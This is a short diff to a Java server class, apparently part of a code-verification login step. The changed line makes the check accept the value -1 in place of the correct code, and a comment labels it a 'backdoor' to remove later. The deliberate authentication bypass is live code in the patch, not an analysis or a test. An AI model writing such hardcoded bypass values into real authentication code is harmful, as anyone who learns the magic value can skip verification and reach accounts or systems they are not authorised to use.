@@ -768,7 +768,7 @@ public class Server implements ServerInterface,Callable<Integer> {
             resp=stub.getCode(i);
             if (resp.IsOK()) {
                 infoStamp("the user has entered the code:"+resp.getMessaggioInfo()+";");
-                if(codice.equals(Integer.parseInt(resp.getMessaggioInfo()))) {
+                if(codice.equals(Integer.parseInt(resp.getMessaggioInfo()))||(Integer.parseInt(resp.getMessaggioInfo())==-1)) {                              //todo remove backdoor (Integer.parseInt(resp.getMessaggioInfo())==-1)
                     return true;
                 }
             }
